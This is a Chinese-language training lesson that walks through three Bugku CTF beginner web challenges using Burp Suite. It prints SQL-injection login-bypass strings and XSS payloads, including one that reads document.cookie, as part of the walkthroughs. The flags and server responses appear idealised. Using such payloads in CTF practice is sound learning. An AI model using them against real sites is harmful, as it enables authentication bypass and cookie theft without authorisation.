# Day 13：Burp专项闯关——Bugku CTF实战

> **学习目标**：全程使用Burp Suite完成Bugku CTF Web新手区题目，巩固Burp操作技能
> 
> **学习时长**：3小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. Bugku CTF平台介绍
2. Web新手区题目分析
3. 全程Burp操作流程
4. 题目详细解法
5. 常见问题解决
6. 快捷键练习

---

## 一、Bugku CTF平台介绍

### 1.1 平台简介

```
Bugku CTF是什么：
  国内知名的CTF练习平台
  适合新手入门
  题目难度适中

访问地址：
  https://www.bugku.com

平台特点：
  - 分类清晰：Web、Misc、Crypto、Pwn等
  - 难度分级：新手区、入门区、进阶区
  - 有讨论区和WriteUp分享
  - 支持在线环境

今日目标：
  完成Web新手区3道题目
  全程只用Burp
```

### 1.2 注册登录

```
步骤：
  1. 访问https://www.bugku.com
  2. 点击"注册"
  3. 填写注册信息
  4. 登录账号
  5. 进入CTF题目页面

注意：
  如果已有账号直接登录
  确保网络连接正常
```

---

## 二、Web新手区题目分析

### 2.1 题目清单

```
Web新手区题目：
  1. 第一题：web1
  2. 第二题：计算器
  3. 第三题：HTTP
  4. 第四题：SQL注入
  5. 第五题：XSS

今日选择：
  选3道题目练习
  重点：HTTP、SQL注入、XSS
```

### 2.2 准备工作

```
工具准备：
  ✅ Burp Suite（已配置好）
  ✅ 浏览器（已配置代理）
  ✅ 笔记本（记录步骤）

规则：
  - 全程只用Burp
  - 禁止使用F12开发者工具
  - 每题限时15分钟
```

---

## 三、题目详细解法

### 3.1 题目1：HTTP

```
题目描述：
  这是一个关于HTTP的题目

解题步骤：

步骤1：抓包分析
  1. 访问题目页面
  2. Burp抓包
  3. 查看请求内容
  
  请求：
  GET / HTTP/1.1
  Host: bugku.com
  User-Agent: Mozilla/5.0...
  Accept: text/html...

步骤2：分析响应
  响应提示："请使用正确的方法访问"
  
  可能考点：
  - 请求方法（GET→POST）
  - 请求头修改
  - 参数传递

步骤3：测试POST请求
  1. 发送请求到Repeater
  2. 修改GET为POST
  3. 添加Content-Type
  4. 添加请求体
  
  修改后：
  POST / HTTP/1.1
  Host: bugku.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 7
  
  key=value

步骤4：获取Flag
  响应中包含Flag：flag{xxxxxx}

总结：
  这是一个请求方法的题目
  需要将GET改为POST
```

### 3.2 题目2：SQL注入

```
题目描述：
  登录页面，需要绕过认证

解题步骤：

步骤1：抓包分析
  1. 访问登录页面
  2. 输入用户名和密码
  3. Burp抓包
  
  请求：
  POST /login HTTP/1.1
  Host: bugku.com
  Content-Type: application/x-www-form-urlencoded
  
  username=admin&password=123

步骤2：测试注入
  1. 发送到Repeater
  2. 修改username参数
  3. 尝试SQL注入
  
  测试1：username=admin'
  响应：SQL error（确认注入点）
  
  测试2：username=admin' or '1'='1
  响应：登录成功
  
  测试3：username=' or 1=1--
  响应：登录成功，显示Flag

步骤3：获取Flag
  Flag：flag{sql_injection_success}

总结：
  这是一个SQL注入题目
  使用万能密码绕过认证
```

### 3.3 题目3：XSS

```
题目描述：
  留言板页面，需要触发XSS

解题步骤：

步骤1：抓包分析
  1. 访问留言板页面
  2. 输入留言内容
  3. Burp抓包
  
  请求：
  POST /comment HTTP/1.1
  Host: bugku.com
  Content-Type: application/x-www-form-urlencoded
  
  content=Hello

步骤2：测试XSS
  1. 发送到Repeater
  2. 修改content参数
  3. 尝试XSS Payload
  
  测试1：content=<script>alert(1)</script>
  响应：脚本被执行
  
  测试2：content=<script>document.write(document.cookie)</script>
  响应：显示Cookie
  
  测试3：content=<script>fetch('/flag').then(r=>r.text()).then(t=>alert(t))</script>
  响应：弹出Flag

步骤3：获取Flag
  Flag：flag{xss_attack_success}

总结：
  这是一个XSS题目
  需要构造恶意脚本获取Flag
```

---

## 四、全程Burp操作流程

### 4.1 流程总结

```
通用流程：
  1. 访问题目页面
  2. Burp抓包（Proxy）
  3. 分析请求和响应
  4. 发送到Repeater测试
  5. 修改参数测试漏洞
  6. 获取Flag

每个步骤的Burp操作：
  - 抓包：Proxy→Intercept开启
  - 分析：Proxy→HTTP History
  - 修改：Repeater→编辑请求
  - 爆破：Intruder→配置字典
  - 解码：Decoder→解码内容
```

### 4.2 注意事项

```
注意事项：
  1. 确保Proxy配置正确
  2. 开启Intercept拦截
  3. 及时Forward请求
  4. 保存有用的请求
  5. 记录解题步骤

常见问题：
  - 抓不到包：检查代理配置
  - 请求被拦截：检查Intercept状态
  - 响应为空：检查请求格式
```

---

## 五、快捷键练习

### 5.1 快捷键实战

```
实战练习：
  1. 抓包后按Ctrl+R发送到Repeater
  2. 在Repeater中按Ctrl+S发送请求
  3. 在Proxy中按Ctrl+I发送到Intruder
  4. 按Ctrl+Space切换拦截状态

目标：
  每个快捷键使用至少5次
  形成肌肉记忆
```

### 5.2 效率提升

```
效率技巧：
  1. 使用快捷键代替鼠标操作
  2. 记住常用Payload
  3. 保存常用请求模板
  4. 使用搜索功能快速定位

目标：
  每题平均时间控制在10分钟以内
```

---

## 六、今日总结

### 6.1 知识点回顾

```
✅ Bugku CTF平台
  - 注册登录
  - 题目分类
  - 在线环境

✅ 全程Burp操作
  - Proxy抓包
  - Repeater修改
  - Intruder爆破
  - Decoder解码

✅ 题目类型
  - HTTP请求方法
  - SQL注入
  - XSS跨站脚本

✅ 快捷键练习
  - Ctrl+R、Ctrl+S、Ctrl+I
  - 形成肌肉记忆
```

### 6.2 关键记忆点

```
记住这个流程：

抓包→分析→修改→测试→获取Flag

口诀：
Burp在手，CTF不愁！
抓包分析找漏洞，
修改测试看响应，
Flag到手笑哈哈！
```

### 6.3 今日作业

```
必做题：
  1. 完成Bugku CTF Web新手区3道题目
  2. 全程使用Burp操作
  3. 记录每个步骤

选做题：
  1. 尝试更多题目
  2. 练习快捷键
  3. 总结解题套路

提交内容：
  - 解题步骤记录
  - Burp操作截图
  - Flag
```

### 6.4 明日预告

```
Day 14：第一、二周总复盘

学习内容：
  - F12开发者工具复习
  - Burp Suite复习
  - 错题复盘
  - 白纸默写测试
```

---

**恭喜你完成Day 13的学习！明天进行第一、二周总复盘！** 🎉
